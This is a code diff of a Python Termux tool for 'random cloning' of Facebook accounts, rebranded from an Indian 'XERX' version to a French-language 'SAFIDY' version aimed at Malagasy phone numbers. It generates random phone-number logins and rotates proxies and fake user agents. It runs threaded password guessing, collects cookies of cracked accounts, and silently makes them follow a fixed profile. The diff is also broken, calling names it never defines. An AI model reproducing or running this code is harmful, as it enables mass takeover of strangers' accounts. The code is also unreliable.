@@ -1,193 +1,114 @@
-import os,sys,time,json,random,re,string,platform,base64,uuid
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup
-import requests as ress
-from datetime import date
-from datetime import datetime
-from time import sleep
-from os import system as s
-from time import sleep as waktu
-try:
-    import requests
-    from concurrent.futures import ThreadPoolExecutor as ThreadPool
-    import mechanize
-    from requests.exceptions import ConnectionError
-except ModuleNotFoundError:
-    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
-    os.system('pip install bs4')
-RED = '\033[1;91m'
-WHITE = '\033[1;97m'
-GREEN = '\033[1;32m' 
-YELLOW = '\033[1;33m'
-BLUE = '\033[1;34m'
-ORANGE = '\033[1;35m'
-P = '\x1b[1;97m' 
-M = '\x1b[1;91m' 
-H = '\x1b[1;92m' 
-K = '\x1b[1;93m' 
-B = '\x1b[1;94m' 
-U = '\x1b[1;95m' 
-O = '\x1b[1;96m' 
-N = '\x1b[0m'    
-A = '\x1b[1;90m' 
-BN = '\x1b[1;107m' 
-BBL = '\x1b[1;106m' 
-BP = '\x1b[1;105m' 
-BB = '\x1b[1;104m' 
-BK = '\x1b[1;103m' 
-BH = '\x1b[1;102m' 
-BM = '\x1b[1;101m' 
-BA = '\x1b[1;100m' 
-now = datetime.now()
-dt_string = now.strftime("%H:%M")
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-today = date.today() 
-loop = 0
-oks = []
-cps = []
-ugen2=[]
-ugen=[]
-cokbrut=[]
-ses=requests.Session()
-princp=[]
-try:
- prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
- open('.prox.txt','w').write(prox)
-except Exception as e:
- print('')
-prox=open('.prox.txt','r').read().splitlines()
-for xd in range(10000):
-    a='Nokia'
-    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    c=random.randrange(1, 99)
-    d='/GoBrowser/'
-    e='1.6.0.'
-    f=random.randrange(1, 99)
-    uaku2=(f'{a}{b}{c}{d}{e}{f}')
-    ugen.append(uaku2)
-    
-def __init__(self):
-        self.id = []
-        self.ok = []
-        self.cp = []
-        self.loop = 0
+# Définir le numéro de version
+version_actuelle = "2.0"
 
-logo ="""
-##     ## ######## ########  ##     ## 
- ##   ##  ##       ##     ##  ##   ##  
-  ## ##   ##       ##     ##   ## ##   
-   ###    ######   ########     ###    
-  ## ##   ##       ##   ##     ## ##   
- ##   ##  ##       ##    ##   ##   ##  
-##     ## ######## ##     ## ##     ## 
 
-[+]==============================================
-[+] CREATED BY   :  ARYANxROHIT
-[+] FB GROUP     :  TERMUX TEAM INP COMMAND 
-[+] ON GITHUB    :  XERX-XD
-[+] TOOL STATUS  :  RANDOM
-[+] TOOL VIRSION :  0.2
-[+]=============================================="""
 
-xxxx = str(len(ugen))
-#---------------------[LOOP MENU]---------------------#
-loop = 0
-oks = []
-cps = []
-baby =[]
+import os
+import random
+import string 
+import uuid
+import json
+import subprocess
+from concurrent.futures import ThreadPoolExecutor as tred
+import requests
+import sys
+import secrets
+import getpass
 
-#---------------------[APPLICATION CHECKER]---------------------#
-def cek_apk(session,coki):
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print('\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \033[1;93mSorry there is no Active  Apk')
-    else:
-        print('\r[🎮] \033[1;92m ☆ Your Active Apps ☆ \033[1;91m: \033[1;96m')
-        for i in range(len(game)):
-            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-            
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print('\r\033[1;92m[+]\033[1;91m Sorry there is no Expired Apk')
-    else:
-        print('\r[🎮] \033[1;96m ◇ Your Expired Apps ◇ \033[1;91m: \033[1;92m')
-        for i in range(len(game)):
-            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
-        else:
-            print('\033[1;97m====================================================') 
-def follow(ses,coki):
-    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
-    get = r.find('a', string='Follow').get('href')
-    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
-    
-    		
-def xerx():
-    os.system("clear")
+# Mot de passe pour déverrouiller le script
+mot_de_passe = "ITACHI2024"
+
+# Demander à l'utilisateur de saisir le mot de passe
+saisie_mot_de_passe = getpass.getpass("Veuillez entrer le mot de passe : ")
+
+# Vérifier si le mot de passe saisi est correct
+if saisie_mot_de_passe == mot_de_passe:
+    print("Mot de passe correct. Exécution de git pull...")
+    # Exécuter la commande git pull
+    try:
+        subprocess.run(["git", "pull"], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Erreur lors de l'exécution de git pull : {e}")
+        exit(1)
+    print("Git pull terminé avec succès !")
+
+#-------------color----------------#
+bblack="\033[1;30m"         # Black
+M="\033[1;31m"            # Red
+H="\033[1;32m"         # Green
+byellow="\033[1;33m"        # Yellow
+bblue="\033[1;34m"          # Blue
+P="\033[1;35m"        # Purple
+C="\033[1;36m"          # Cyan
+B="\033[1;37m"         # White
+my_color = [
+ B,C,P,H]
+warna = random.choice(my_color)
+oks=[]
+cps=[]
+loop=0
+# Liste des couleurs pour le logo, les lignes et chaque mot
+logo_colors = [B, C, P, H]
+line_colors = [bblack, M, H, byellow, bblue, P, C, B]
+word_colors = [B, C, P, H, M, byellow, bblue, P, C, B]
+#-------------logo-----------------#
+logo=(f'''{B}
+
+
+                                 
+,--.  ,--.,------.,--.,--.  ,--. 
+|  ,'.|  ||  .---'|  ||  ,'.|  | 
+|  |' '  ||  `--, |  ||  |' '  | 
+|  | `   ||  `---.|  ||  | `   | 
+`--'  `--'`------'`--'`--'  `--' 
+                                 
+
+                                            
+
+{warna}--------------------------------------------{B}
+ Owner    : {M}SAFIDINIAINA{M}
+ TOOL NAME : {warna}{P}SAFIDY{P}{warna}
+ GROUPE-FB   : NONE
+ STATUE : {H}PAID{H}
+ Facebook : {bblue}SM{bblue}
+ Tools    : {warna}[{M}VERSION 2.0{warna}]{warna}
+--------------------------------------------{B}''')
+#-------------linex def -------------#
+def linex():
+    print(f'{warna}--------------------------------------------{B}')
+#-------------clear def -------------#
+def clear():
+    os.system('clear')
     print(logo)
-    
-    print("[1] RANDOM CLONE NP\n[2] RANDOM CLONE IND\n[3] RANDOM CLONE PK\n[4] RANDOM CLONE BD\n[5] RANDOM CLONE WITH CHOOSE PSWD\n[6] RANDOM CLONE WITH I LOVE YOU & FREE FIRE PSWD\n[7] CONTACT OWNER")
-    print(49*'=')
-    aryan = input("✓CHOOSE>")
-    if aryan =='1':xerx1()
-    elif aryan =='2':xerx2()
-    elif aryan =='3':xerx3()
-    elif aryan =='4':xerx4()
-    elif aryan =='5':xerx5()
-    elif aryan =='6':xerx6()
-    elif aryan =='7':os.system("xdg-open https://www.facebook.com/aaryan.chaudhary69")
+#-------------main def------------#
+def MR_ITACHI():
+    clear()
+    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
+    print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
+    linex()
+    option=input(f' {B}[{warna}??{B}] CHOISIR MENU >> ')
+    if option in ['01','1']:
+        BD_CLONING()
     else:
-        print("SELECT CORRECT OPTION")
-        xerx()
-    
-def xerx1():
-	user=[]
-	os.system('clear')
-	print(logo)
-	print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (9817)')
-	print(47*'-')
-	kode = input('[?] Input Code : ')
-	print(47*'-')
-	limit = int(input('[?] How many numbers do you want to add : '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		user.append(nmp)
-	os.system("clear")
-	print(logo)
-	print("                CHOOSE METHOD                       ")
-	print("[+]==============================================")
-	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
-	print(49*'=')
-	xerxfire = input("[+] [CHOOSE] :- ")
-	os.system("clear")
-	print(logo)
-	print("                TRY SOMETHING NEW                       ")
-	print("[+]==============================================")
-	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
-	print("[+]==============================================")
-	xerxlovesyou = input("[+] [CHOOSE] :- ")
-	if xerxlovesyou in ['y','Y','1','yes','YES','Yes']:
-		xerx_xd.append('y')
-	else:
-		xerx_xd.append('n')
-	print("[+]==============================================")
-	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
-	print("[+]==============================================")
-	xerxtop = input("[+] [CHOOSE] :- ")
-	if xerxtop in ['y','Y','Yes','YES','1']:
-		baby.append('y')
-	else:
-		baby.append('n')
-	with ThreadPool(max_workers=30) as yaari:
+        exit(' MERCI BEAUCOUP  :)')
+#------------- bd clone def ----------#
+def BD_CLONING():
+    user=[]
+    clear()
+    print(' CODE SIM MALAGASY : [+26132] [+26134] [+26138] [+26133]')
+    print(' 261=0 Madagascar : [032] [034] [038] [033]')
+    code=input(' ENTER SIM CODE >> ')
+    linex()
+    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
+    try:
+        limit=int(input(' ENTER LIMIT >> '))
+    except ValueError:
+        limit=50000
+    clear()
+    for nmbr in range(limit):
+        nmp=''.join(map(str, generate_random_sequence(7)))
+        user.append(nmp)
+    with ThreadPool(max_workers=80) as yaari:
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
@@ -204,8 +125,15 @@ def xerx1():
 			elif xerxfire =='4':yaari.submit(mobile,uid,pwx,tl)
 			elif xerxfire =='5':yaari.submit(freeq,uid,pwx,tl)
 			elif xerxfire =='6':yaari.submit(d,uid,pwx,tl)
-			linex()
-			
+			else:
+			    yaari.submit(p,uid,pwx,tl)
+            
+    linex()
+    print(' LE CLONING EST FINI ')
+    print(' TOTAL OK ID '+str(len(oks)))
+    print(' TOTAL CP ID '+str(len(cps)))
+    input(' PRESS ENTER TO BACK  : ')
+    MR_ITACHI()
 #------------ method crack def ---------#
 def method_crack(ids, passlist):
     global oks
@@ -253,3 +181,11 @@ def method_crack(ids, passlist):
     except:
         pass
 #-------------end----------------#
+
+# Générateur de séquence aléatoire
+def generate_random_sequence(length):
+    sequence = [random.choice(string.digits) for _ in range(length)]
+    return sequence
+
+# Appel à la fonction MR_ITACHI pour démarrer le programme
+MR_ITACHI()
